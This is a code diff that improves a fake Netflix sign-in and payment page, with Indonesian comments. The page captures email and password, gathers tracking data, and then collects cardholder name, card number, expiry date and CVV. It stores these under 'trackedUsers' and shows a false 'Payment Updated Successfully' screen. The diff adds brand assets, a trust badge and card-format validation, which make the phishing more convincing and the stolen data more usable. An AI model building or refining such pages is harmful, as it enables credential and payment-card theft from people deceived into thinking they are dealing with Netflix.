@@ -33,21 +33,73 @@
         footer a:hover {
             text-decoration: underline;
         }
+        .input-focus {
+            position: relative;
+        }
+        .input-focus label {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            color: #8c8c8c;
+            transition: all 0.2s ease;
+            pointer-events: none;
+        }
+        .input-focus input:focus + label,
+        .input-focus input:not(:placeholder-shown) + label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            color: #e50914;
+            background: #333;
+            padding: 0 4px;
+        }
+        .card-icon {
+            width: 40px;
+            height: 25px;
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        .visa { background-image: url('https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_visa.png'); }
+        .mastercard { background-image: url('https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_mastercard.png'); }
+        .amex { background-image: url('https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_amex.png'); }
+        .secure-badge::before {
+            content: '🔒';
+            margin-right: 4px;
+        }
     </style>
 </head>
 <body>
     <!-- Halaman Login -->
     <div id="loginPage" class="overlay flex flex-col">
-        <header class="p-4 md:p-6">
+        <header class="p-4 md:p-6 flex justify-between items-center">
             <div class="netflix-logo"></div>
+            <div class="flex items-center space-x-4">
+                <select class="bg-transparent border border-gray-400 rounded px-2 py-1 text-sm">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                </select>
+                <a href="#" class="text-white text-sm font-medium hover:underline">Sign In</a>
+            </div>
         </header>
         <main class="flex-grow flex items-center justify-center px-4">
             <div class="bg-black bg-opacity-75 p-6 md:p-16 rounded w-full max-w-[450px]">
                 <h1 class="text-3xl font-semibold mb-8">Sign In</h1>
-                <div id="loginForm" class="space-y-4">
-                    <input id="email" type="email" placeholder="Email or phone number" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
-                    <input id="password" type="password" placeholder="Password" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
-                    <button id="signInButton" class="w-full bg-[#e50914] text-white p-4 rounded hover:bg-[#c11119] font-medium">Sign In</button>
+                <div id="loginForm" class="space-y-6">
+                    <div class="input-focus">
+                        <input id="email" type="email" placeholder=" " class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                        <label for="email">Email or phone number</label>
+                    </div>
+                    <div class="input-focus">
+                        <input id="password" type="password" placeholder=" " class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                        <label for="password">Password</label>
+                    </div>
+                    <button id="signInButton" class="w-full bg-[#e50914] text-white p-4 rounded hover:bg-[#c11119] font-medium flex justify-center items-center">
+                        <span id="signInText">Sign In</span>
+                        <svg id="loadingSpinner" class="animate-spin h-5 w-5 ml-2 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </button>
                     <div class="flex justify-between items-center text-sm text-gray-400">
                         <label class="flex items-center">
                             <input type="checkbox" class="mr-2">
@@ -81,21 +133,101 @@
 
     <!-- Halaman Pembayaran -->
     <div id="paymentPage" class="overlay flex flex-col hidden">
-        <header class="p-4 md:p-6">
+        <header class="p-4 md:p-6 flex justify-between items-center">
             <div class="netflix-logo"></div>
+            <div class="flex items-center space-x-4">
+                <select class="bg-transparent border border-gray-400 rounded px-2 py-1 text-sm">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                </select>
+                <a href="#" class="text-white text-sm font-medium hover:underline">Sign Out</a>
+            </div>
         </header>
         <main class="flex-grow flex items-center justify-center px-4">
-            <div class="bg-black bg-opacity-75 p-6 md:p-16 rounded w-full max-w-[450px]">
-                <h1 class="text-2xl font-semibold mb-8">Update Your Payment Method</h1>
-                <div id="paymentForm" class="space-y-4">
-                    <input id="cardHolder" type="text" placeholder="Name on Card" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
-                    <input id="cardNumber" type="text" placeholder="Card Number" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
-                    <div class="flex space-x-4">
-                        <input id="expiryDate" type="text" placeholder="MM/YY" class="w-1/2 p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
-                        <input id="cvv" type="text" placeholder="CVV" class="w-1/2 p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+            <div class="bg-black bg-opacity-75 p-6 md:p-16 rounded w-full max-w-[550px]">
+                <div class="flex items-center justify-center mb-8">
+                    <div class="flex items-center space-x-4 text-sm">
+                        <span class="text-gray-400">Step 1 of 2</span>
+                        <div class="flex space-x-2">
+                            <div class="w-4 h-4 bg-[#e50914] rounded-full"></div>
+                            <div class="w-4 h-4 bg-gray-600 rounded-full"></div>
+                        </div>
                     </div>
-                    <button id="submitPaymentButton" class="w-full bg-[#e50914] text-white p-4 rounded hover:bg-[#c11119] font-medium">Submit Payment</button>
                 </div>
+                <h1 class="text-2xl font-semibold mb-4">Set up your payment</h1>
+                <p class="text-gray-400 mb-6">Your membership starts as soon as you set up payment.</p>
+                <div class="flex items-center mb-6">
+                    <span class="secure-badge text-sm text-gray-400">Secure connection</span>
+                </div>
+                <div id="paymentForm" class="space-y-6">
+                    <div class="flex space-x-4 mb-6">
+                        <button class="card-icon visa border-2 border-gray-400 rounded p-1" data-card="visa"></button>
+                        <button class="card-icon mastercard border-2 border-gray-400 rounded p-1" data-card="mastercard"></button>
+                        <button class="card-icon amex border-2 border-gray-400 rounded p-1" data-card="amex"></button>
+                    </div>
+                    <div class="input-focus">
+                        <input id="cardHolder" type="text" placeholder=" " class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                        <label for="cardHolder">Name on Card</label>
+                    </div>
+                    <div class="input-focus">
+                        <input id="cardNumber" type="text" placeholder=" " class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                        <label for="cardNumber">Card Number</label>
+                    </div>
+                    <div class="flex space-x-4">
+                        <div class="input-focus w-1/2">
+                            <input id="expiryDate" type="text" placeholder=" " class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                            <label for="expiryDate">Expiration Date (MM/YY)</label>
+                        </div>
+                        <div class="input-focus w-1/2">
+                            <input id="cvv" type="text" placeholder=" " class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                            <label for="cvv">CVV</label>
+                        </div>
+                    </div>
+                    <button id="submitPaymentButton" class="w-full bg-[#e50914] text-white p-4 rounded hover:bg-[#c11119] font-medium flex justify-center items-center">
+                        <span id="paymentText">Submit Payment</span>
+                        <svg id="paymentSpinner" class="animate-spin h-5 w-5 ml-2 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </main>
+        <footer class="p-6 md:p-8 text-gray-400 text-sm">
+            <div class="max-w-5xl mx-auto">
+                <p class="mb-4">Questions? Call 1-844-505-2993</p>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                    <a href="#" class="hover:underline">FAQ</a>
+                    <a href="#" class="hover:underline">Help Center</a>
+                    <a href="#" class="hover:underline">Terms of Use</a>
+                    <a href="#" class="hover:underline">Privacy</a>
+                    <a href="#" class="hover:underline">Cookie Preferences</a>
+                    <a href="#" class="hover:underline">Corporate Information</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Halaman Konfirmasi -->
+    <div id="confirmationPage" class="overlay flex flex-col hidden">
+        <header class="p-4 md:p-6 flex justify-between items-center">
+            <div class="netflix-logo"></div>
+            <div class="flex items-center space-x-4">
+                <select class="bg-transparent border border-gray-400 rounded px-2 py-1 text-sm">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                </select>
+                <a href="#" class="text-white text-sm font-medium hover:underline">Sign Out</a>
+            </div>
+        </header>
+        <main class="flex-grow flex items-center justify-center px-4">
+            <div class="bg-black bg-opacity-75 p-6 md:p-16 rounded w-full max-w-[550px] text-center">
+                <svg class="w-16 h-16 mx-auto mb-6 text-green-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                </svg>
+                <h1 class="text-2xl font-semibold mb-4">Payment Updated Successfully</h1>
+                <p class="text-gray-400 mb-6">Your payment method has been updated. You're ready to start watching!</p>
+                <button id="backToHomeButton" class="w-full bg-[#e50914] text-white p-4 rounded hover:bg-[#c11119] font-medium">Continue to Netflix</button>
             </div>
         </main>
         <footer class="p-6 md:p-8 text-gray-400 text-sm">
@@ -203,46 +335,99 @@
         }
 
         let userData = {};
+        let selectedCard = 'visa';
 
+        // Format input untuk card number, expiry date, dan CVV
+        document.getElementById('cardNumber').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = value.slice(0, 19);
+        });
+
+        document.getElementById('expiryDate').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value.slice(0, 5);
+        });
+
+        document.getElementById('cvv').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value.slice(0, 4);
+        });
+
+        // Pilih jenis kartu
+        document.querySelectorAll('[data-card]').forEach(button => {
+            button.addEventListener('click', (e) => {
+                selectedCard = e.currentTarget.getAttribute('data-card');
+                document.querySelectorAll('[data-card]').forEach(btn => btn.classList.remove('border-[#e50914]'));
+                e.currentTarget.classList.add('border-[#e50914]');
+            });
+        });
+
+        // Tangani login
         document.getElementById('signInButton').addEventListener('click', async () => {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
             if (email && password) {
+                document.getElementById('signInText').classList.add('hidden');
+                document.getElementById('loadingSpinner').classList.remove('hidden');
                 userData.email = email;
                 userData.password = password;
                 userData.tracking = await collectUserData();
 
-                document.getElementById('loginPage').classList.add('hidden');
-                document.getElementById('paymentPage').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('loginPage').classList.add('hidden');
+                    document.getElementById('paymentPage').classList.remove('hidden');
+                }, 1000);
             } else {
                 alert('Please fill in all fields.');
             }
         });
 
+        // Tangani pengiriman pembayaran
         document.getElementById('submitPaymentButton').addEventListener('click', () => {
             const cardHolder = document.getElementById('cardHolder').value;
             const cardNumber = document.getElementById('cardNumber').value;
             const expiryDate = document.getElementById('expiryDate').value;
             const cvv = document.getElementById('cvv').value;
 
-            if (cardHolder && cardNumber && expiryDate && cvv) {
-                userData.payment = {
-                    cardHolder,
-                    cardNumber,
-                    expiryDate,
-                    cvv
-                };
+            // Validasi format
+            const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            const cvvRegex = selectedCard === 'amex' ? /^\d{4}$/ : /^\d{3}$/;
+            const cardNumberRegex = /^(\d{4}\s){3}\d{4}$/;
 
-                let storedData = JSON.parse(localStorage.getItem('trackedUsers') || '[]');
-                storedData.push(userData);
-                localStorage.setItem('trackedUsers', JSON.stringify(storedData));
-
-                alert('Payment submitted successfully. Thank you!');
-                window.location.reload();
-            } else {
-                alert('Please fill in all payment fields.');
+            if (!cardHolder || !cardNumberRegex.test(cardNumber) || !expiryRegex.test(expiryDate) || !cvvRegex.test(cvv)) {
+                alert('Please fill in all payment fields correctly.\n- Card Number: 16 digits (xxxx xxxx xxxx xxxx)\n- Expiration Date: MM/YY\n- CVV: 3 digits (4 for Amex)');
+                return;
             }
+
+            document.getElementById('paymentText').classList.add('hidden');
+            document.getElementById('paymentSpinner').classList.remove('hidden');
+
+            userData.payment = {
+                cardType: selectedCard,
+                cardHolder,
+                cardNumber,
+                expiryDate,
+                cvv
+            };
+
+            let storedData = JSON.parse(localStorage.getItem('trackedUsers') || '[]');
+            storedData.push(userData);
+            localStorage.setItem('trackedUsers', JSON.stringify(storedData));
+
+            setTimeout(() => {
+                document.getElementById('paymentPage').classList.add('hidden');
+                document.getElementById('confirmationPage').classList.remove('hidden');
+            }, 1000);
+        });
+
+        // Kembali ke halaman awal
+        document.getElementById('backToHomeButton').addEventListener('click', () => {
+            window.location.reload();
         });
     </script>
 </body>
